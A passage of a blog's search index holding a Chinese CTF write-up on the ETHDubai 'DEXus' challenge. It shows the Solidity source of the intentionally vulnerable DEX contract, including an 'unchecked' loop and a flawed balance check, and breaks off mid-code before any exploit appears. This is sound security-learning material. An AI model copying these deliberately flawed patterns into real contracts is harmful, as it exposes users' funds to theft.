<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>危险的Unchecked——ETHDubai DEXus Writeup</title>
      <link href="/2023/03/19/ethdubai-dexus-wp/"/>
      <url>/2023/03/19/ethdubai-dexus-wp/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>周末没事翻着玩，发现了一个比赛，虽然已经结束了但是环境还在，抱着试试的态度挑了一题，没想到一个多小时就做出来了hhh</p><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>题目首先自建了一个DEX，有buy，sell，deposit，withdraw等功能，可以自行交易两种Token。</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token operator">/</span>DExus<span class="token punctuation">.</span>sol<span class="token comment">// SPDX-License-Identifier: none</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.17</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"./interfaces/IDEX.sol"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"./interfaces/IAccount.sol"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"./libraries/ArrayLib.sol"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"./openzeppelin-contracts/utils/EnumerableSet.sol"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"./openzeppelin-contracts/access/Ownable.sol"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"./openzeppelin-contracts/token/ERC20/IERC20.sol"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"./openzeppelin-contracts/token/ERC20/SafeERC20.sol"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"./openzeppelin-contracts/math/Math.sol"</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">DEXus</span> <span class="token keyword">is</span> IDEX<span class="token punctuation">,</span> IAccount<span class="token punctuation">,</span> Ownable <span class="token punctuation">{</span>    <span class="token keyword">using</span> <span class="token class-name">EnumerableSet</span> <span class="token keyword">for</span> EnumerableSet<span class="token punctuation">.</span>AddressSet<span class="token punctuation">;</span>    <span class="token keyword">using</span> <span class="token class-name">ArrayLib</span> <span class="token keyword">for</span> <span class="token builtin">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">using</span> <span class="token class-name">SafeERC20</span> <span class="token keyword">for</span> IERC20<span class="token punctuation">;</span>    EnumerableSet<span class="token punctuation">.</span>AddressSet <span class="token keyword">private</span> tokens<span class="token punctuation">;</span>    <span class="token keyword">mapping</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token operator">=&gt;</span> Pair<span class="token punctuation">)</span> <span class="token keyword">private</span> Pairs<span class="token punctuation">;</span>    <span class="token builtin">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">private</span> PairsList<span class="token punctuation">;</span>    <span class="token keyword">mapping</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token operator">=&gt;</span> <span class="token keyword">mapping</span> <span class="token punctuation">(</span>OrderType <span class="token operator">=&gt;</span> Order<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">private</span> PairOrders<span class="token punctuation">;</span>    <span class="token keyword">mapping</span> <span class="token punctuation">(</span><span class="token builtin">uint</span> <span class="token operator">=&gt;</span> Order<span class="token punctuation">)</span> <span class="token keyword">private</span> AllOrders<span class="token punctuation">;</span>    <span class="token builtin">uint</span> <span class="token keyword">private</span> last_order_id<span class="token punctuation">;</span>    <span class="token comment">// balances</span>    <span class="token keyword">mapping</span> <span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> <span class="token keyword">mapping</span> <span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> <span class="token builtin">uint</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">private</span> overallBalances<span class="token punctuation">;</span> <span class="token comment">// token =&gt; user =&gt; uint</span>    <span class="token keyword">mapping</span> <span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> <span class="token keyword">mapping</span> <span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> <span class="token builtin">uint</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">private</span> lockedBalances<span class="token punctuation">;</span> <span class="token comment">// token =&gt; user =&gt; uint</span>    <span class="token comment">// events</span>    <span class="token keyword">event</span> <span class="token function">PairAdded</span><span class="token punctuation">(</span><span class="token builtin">string</span> pair<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">event</span> <span class="token function">PairDeleted</span><span class="token punctuation">(</span><span class="token builtin">string</span> pair<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">event</span> <span class="token function">NewBuyOrder</span><span class="token punctuation">(</span><span class="token builtin">uint</span> id<span class="token punctuation">,</span> <span class="token builtin">string</span> pair<span class="token punctuation">,</span> <span class="token builtin">address</span> user<span class="token punctuation">,</span> <span class="token builtin">uint</span> amount<span class="token punctuation">,</span> <span class="token builtin">uint</span> price<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">event</span> <span class="token function">NewSellOrder</span><span class="token punctuation">(</span><span class="token builtin">uint</span> id<span class="token punctuation">,</span> <span class="token builtin">string</span> pair<span class="token punctuation">,</span> <span class="token builtin">address</span> user<span class="token punctuation">,</span> <span class="token builtin">uint</span> amount<span class="token punctuation">,</span> <span class="token builtin">uint</span> price<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">event</span> <span class="token function">OrderCompleted</span><span class="token punctuation">(</span><span class="token builtin">uint</span> id<span class="token punctuation">,</span> <span class="token builtin">string</span> pair<span class="token punctuation">,</span> <span class="token builtin">address</span> buyer<span class="token punctuation">,</span> <span class="token builtin">address</span> seller<span class="token punctuation">,</span> <span class="token builtin">uint</span> amount<span class="token punctuation">,</span> <span class="token builtin">uint</span> price<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">event</span> <span class="token function">MarketOrderRemainder</span><span class="token punctuation">(</span><span class="token builtin">address</span> creator<span class="token punctuation">,</span> <span class="token builtin">uint</span> remained_amount<span class="token punctuation">,</span> OrderType orderType<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// modifiers</span>    <span class="token keyword">modifier</span> <span class="token function">onlyCreator</span><span class="token punctuation">(</span>Order <span class="token keyword">storage</span> order<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> order<span class="token punctuation">.</span>creator<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">_</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">modifier</span> <span class="token function">pairExists</span><span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">calldata</span> pair_name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>Pairs<span class="token punctuation">[</span>pair_name<span class="token punctuation">]</span><span class="token punctuation">.</span>first_token_addr <span class="token operator">!=</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"Pair doesn't exist"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">_</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">modifier</span> <span class="token function">tokenExists</span><span class="token punctuation">(</span><span class="token builtin">address</span> token<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>tokens<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"Token isn't supported"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">_</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">// owner functions</span>    <span class="token keyword">function</span> <span class="token function">addPair</span><span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">calldata</span> pair_name<span class="token punctuation">,</span>                     <span class="token builtin">address</span> first_token_addr<span class="token punctuation">,</span>                      <span class="token builtin">address</span> second_token_addr<span class="token punctuation">,</span>                      <span class="token builtin">uint</span> price_decimals<span class="token punctuation">)</span> <span class="token keyword">external</span> onlyOwner <span class="token punctuation">{</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>Pairs<span class="token punctuation">[</span>pair_name<span class="token punctuation">]</span><span class="token punctuation">.</span>first_token_addr <span class="token operator">==</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"Pair exists"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tokens<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>first_token_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>        tokens<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>second_token_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>        Pair <span class="token keyword">memory</span> p <span class="token operator">=</span> <span class="token function">Pair</span><span class="token punctuation">(</span><span class="token punctuation">{</span>first_token_addr<span class="token punctuation">:</span> first_token_addr<span class="token punctuation">,</span>                         second_token_addr<span class="token punctuation">:</span> second_token_addr<span class="token punctuation">,</span>                        price_decimals<span class="token punctuation">:</span> price_decimals<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Pairs<span class="token punctuation">[</span>pair_name<span class="token punctuation">]</span> <span class="token operator">=</span> p<span class="token punctuation">;</span>        PairsList<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>pair_name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">emit</span> <span class="token function">PairAdded</span><span class="token punctuation">(</span>pair_name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">deletePair</span><span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">calldata</span> pair_name<span class="token punctuation">)</span> <span class="token keyword">external</span> onlyOwner <span class="token function">pairExists</span><span class="token punctuation">(</span>pair_name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Pair <span class="token keyword">storage</span> p <span class="token operator">=</span> Pairs<span class="token punctuation">[</span>pair_name<span class="token punctuation">]</span><span class="token punctuation">;</span>        tokens<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>first_token_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>        tokens<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>second_token_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>        PairsList<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>pair_name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">delete</span> PairOrders<span class="token punctuation">[</span>pair_name<span class="token punctuation">]</span><span class="token punctuation">[</span>OrderType<span class="token punctuation">.</span>BUY<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">delete</span> PairOrders<span class="token punctuation">[</span>pair_name<span class="token punctuation">]</span><span class="token punctuation">[</span>OrderType<span class="token punctuation">.</span>SELL<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">delete</span> Pairs<span class="token punctuation">[</span>pair_name<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">emit</span> <span class="token function">PairDeleted</span><span class="token punctuation">(</span>pair_name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">// view functions</span>    <span class="token keyword">function</span> <span class="token function">fetchPairs</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">view</span> <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> PairsList<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">getPair</span><span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">calldata</span> pair_name<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">view</span> <span class="token keyword">returns</span><span class="token punctuation">(</span>Pair <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> Pairs<span class="token punctuation">[</span>pair_name<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span> token<span class="token punctuation">,</span> <span class="token builtin">address</span> user<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">view</span> <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">_countBalance</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">fetchBuyOrders</span><span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">calldata</span> pair_name<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">view</span> <span class="token keyword">returns</span><span class="token punctuation">(</span>Order<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> PairOrders<span class="token punctuation">[</span>pair_name<span class="token punctuation">]</span><span class="token punctuation">[</span>OrderType<span class="token punctuation">.</span>BUY<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">fetchSellOrders</span><span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">calldata</span> pair_name<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">view</span> <span class="token keyword">returns</span><span class="token punctuation">(</span>Order<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> PairOrders<span class="token punctuation">[</span>pair_name<span class="token punctuation">]</span><span class="token punctuation">[</span>OrderType<span class="token punctuation">.</span>SELL<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">// user functions</span>    <span class="token keyword">function</span> <span class="token function">deposit</span><span class="token punctuation">(</span><span class="token builtin">address</span> token<span class="token punctuation">,</span> <span class="token builtin">uint</span> amount<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token function">tokenExists</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span> <span class="token punctuation">{</span>        overallBalances<span class="token punctuation">[</span>token<span class="token punctuation">]</span><span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> amount<span class="token punctuation">;</span>        <span class="token function">IERC20</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">safeTransferFrom</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token builtin">address</span> token<span class="token punctuation">,</span> <span class="token builtin">uint</span> amount<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token function">tokenExists</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token builtin">uint</span> unlockedBalance <span class="token operator">=</span> <span class="token function">_countBalance</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>unlockedBalance <span class="token operator">&gt;=</span> amount<span class="token punctuation">,</span> <span class="token string">"Insufficient unlocked balance"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        overallBalances<span class="token punctuation">[</span>token<span class="token punctuation">]</span><span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> unlockedBalance <span class="token operator">-</span> amount<span class="token punctuation">;</span>        <span class="token function">IERC20</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">safeTransfer</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">buyOrderMarket</span><span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">calldata</span> pair_name<span class="token punctuation">,</span> <span class="token builtin">uint</span> amount<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token function">pairExists</span><span class="token punctuation">(</span>pair_name<span class="token punctuation">)</span><span class="token punctuation">{</span>        Order<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">storage</span> orderList <span class="token operator">=</span> PairOrders<span class="token punctuation">[</span>pair_name<span class="token punctuation">]</span><span class="token punctuation">[</span>OrderType<span class="token punctuation">.</span>SELL<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token builtin">uint</span> ordersLength <span class="token operator">=</span> orderList<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>ordersLength <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"No sell orders"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Pair <span class="token keyword">storage</span> p <span class="token operator">=</span> Pairs<span class="token punctuation">[</span>pair_name<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token builtin">uint</span> remainingAmount <span class="token operator">=</span> amount<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>remainingAmount <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> ordersLength <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            Order <span class="token keyword">storage</span> o <span class="token operator">=</span> orderList<span class="token punctuation">[</span>ordersLength <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token builtin">uint</span> amount_ <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>o<span class="token punctuation">.</span>amount<span class="token punctuation">,</span> remainingAmount<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token builtin">uint</span> buyerPrice <span class="token operator">=</span> <span class="token punctuation">(</span>amount_ <span class="token operator">*</span> o<span class="token punctuation">.</span>price<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token punctuation">(</span><span class="token number">10</span> <span class="token operator">**</span> p<span class="token punctuation">.</span>price_decimals<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token function">_countBalance</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>second_token_addr<span class="token punctuation">,</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span> <span class="token operator">&gt;=</span> amount_<span class="token punctuation">,</span> <span class="token string">"Insufficient unlocked balance"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            remainingAmount <span class="token operator">-=</span> amount_<span class="token punctuation">;</span>            overallBalances<span class="token punctuation">[</span>p<span class="token punctuation">.</span>first_token_addr<span class="token punctuation">]</span><span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> amount_<span class="token punctuation">;</span>            overallBalances<span class="token punctuation">[</span>p<span class="token punctuation">.</span>second_token_addr<span class="token punctuation">]</span><span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> buyerPrice<span class="token punctuation">;</span>                        overallBalances<span class="token punctuation">[</span>p<span class="token punctuation">.</span>first_token_addr<span class="token punctuation">]</span><span class="token punctuation">[</span>o<span class="token punctuation">.</span>creator<span class="token punctuation">]</span> <span class="token operator">-=</span> amount_<span class="token punctuation">;</span>            lockedBalances<span class="token punctuation">[</span>p<span class="token punctuation">.</span>first_token_addr<span class="token punctuation">]</span><span class="token punctuation">[</span>o<span class="token punctuation">.</span>creator<span class="token punctuation">]</span> <span class="token operator">-=</span> amount_<span class="token punctuation">;</span>            overallBalances<span class="token punctuation">[</span>p<span class="token punctuation">.</span>second_token_addr<span class="token punctuation">]</span><span class="token punctuation">[</span>o<span class="token punctuation">.</span>creator<span class="token punctuation">]</span> <span class="token operator">+=</span> buyerPrice<span class="token punctuation">;</span>            <span class="token keyword">emit</span> <span class="token function">OrderCompleted</span><span class="token punctuation">(</span>o<span class="token punctuation">.</span>id<span class="token punctuation">,</span> pair_name<span class="token punctuation">,</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> o<span class="token punctuation">.</span>creator<span class="token punctuation">,</span> amount_<span class="token punctuation">,</span> o<span class="token punctuation">.</span>price<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>o<span class="token punctuation">.</span>amount <span class="token operator">&gt;</span> amount_<span class="token punctuation">)</span> <span class="token punctuation">{</span>                o<span class="token punctuation">.</span>amount <span class="token operator">-=</span> amount_<span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">delete</span> AllOrders<span class="token punctuation">[</span>o<span class="token punctuation">.</span>id<span class="token punctuation">]</span><span class="token punctuation">;</span>            orderList<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            ordersLength<span class="token operator">--</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>remainingAmount <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">emit</span> <span class="token function">MarketOrderRemainder</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> remainingAmount<span class="token punctuation">,</span> OrderType<span class="token punctuation">.</span>BUY<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">buyOrderLimit</span><span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">calldata</span> pair_name<span class="token punctuation">,</span> <span class="token builtin">uint</span> amount<span class="token punctuation">,</span> <span class="token builtin">uint</span> price<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token function">pairExists</span><span class="token punctuation">(</span>pair_name<span class="token punctuation">)</span><span class="token punctuation">{</span>        Pair <span class="token keyword">storage</span> p <span class="token operator">=</span> Pairs<span class="token punctuation">[</span>pair_name<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token builtin">uint</span> spentAmount <span class="token operator">=</span> <span class="token punctuation">(</span>amount <span class="token operator">*</span> price<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token punctuation">(</span><span class="token number">10</span> <span class="token operator">**</span> p<span class="token punctuation">.</span>price_decimals<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token function">_countBalance</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>second_token_addr<span class="token punctuation">,</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span> <span class="token operator">&gt;=</span> spentAmount<span class="token punctuation">,</span> <span class="token string">"Insufficient unlocked balance"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        lockedBalances<span class="token punctuation">[</span>p<span class="token punctuation">.</span>second_token_addr<span class="token punctuation">]</span><span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> spentAmount<span class="token punctuation">;</span>        last_order_id<span class="token operator">++</span><span class="token punctuation">;</span>        Order<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">storage</span> orderList <span class="token operator">=</span> PairOrders<span class="token punctuation">[</span>pair_name<span class="token punctuation">]</span><span class="token punctuation">[</span>OrderType<span class="token punctuation">.</span>BUY<span class="token punctuation">]</span><span class="token punctuation">;</span>        Order <span class="token keyword">memory</span> new_order <span class="token operator">=</span> <span class="token function">Order</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            id<span class="token punctuation">:</span> last_order_id<span class="token punctuation">,</span>            pair_name<span class="token punctuation">:</span> pair_name<span class="token punctuation">,</span>            amount<span class="token punctuation">:</span> amount<span class="token punctuation">,</span>            price<span class="token punctuation">:</span> price<span class="token punctuation">,</span>            creator<span class="token punctuation">:</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span>            orderType<span class="token punctuation">:</span> OrderType<span class="token punctuation">.</span>BUY        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        orderList<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>new_order<span class="token punctuation">)</span><span class="token punctuation">;</span>        AllOrders<span class="token punctuation">[</span>last_order_id<span class="token punctuation">]</span> <span class="token operator">=</span> new_order<span class="token punctuation">;</span>        <span class="token comment">// gas optimization</span>        unchecked <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">uint</span> i <span class="token operator">=</span> orderList<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i <span class="token operator">&gt;</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>orderList<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>price <span class="token operator">&gt;</span> orderList<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>price<span class="token punctuation">)</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                                <span class="token comment">// swap orders</span>                Order <span class="token keyword">memory</span> tmp <span class="token operator">=</span> orderList<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                orderList<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> orderList<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                orderList<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">emit</span> <span class="token function">NewBuyOrder</span><span class="token punctuation">(</span>last_order_id<span class="token punctuation">,</span> pair_name<span class="token punctuation">,</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> amount<span class="token punctuation">,</span> price<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">sellOrderMarket</span><span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">calldata</span> pair_name<span class="token punctuation">,</span> <span class="token builtin">uint</span> amount<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token function">pairExists</span><span class="token punctuation">(</span>pair_name<span class="token punctuation">)</span><span class="token punctuation">{</span>        Order<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">storage</span> orderList <span class="token operator">=</span> PairOrders<span class="token punctuation">[</span>pair_name<span class="token punctuation">]</span><span class="token punctuation">[</span>OrderType<span class="token punctuation">.</span>BUY<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token builtin">uint</span> ordersLength <span class="token operator">=</span> orderList<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>ordersLength <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"No buy orders"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Pair <span class="token keyword">storage</span> p <span class="token operator">=</span> Pairs<span class="token punctuation">[</span>pair_name<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token builtin">uint</span> remainingAmount <span class="token operator">=</span> amount<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>remainingAmount <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> ordersLength <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            Order <span class="token keyword">storage</span> o <span class="token operator">=</span> orderList<span class="token punctuation">[</span>ordersLength <span class="token operator">-</span> <span class="token number">1</span><span class="token 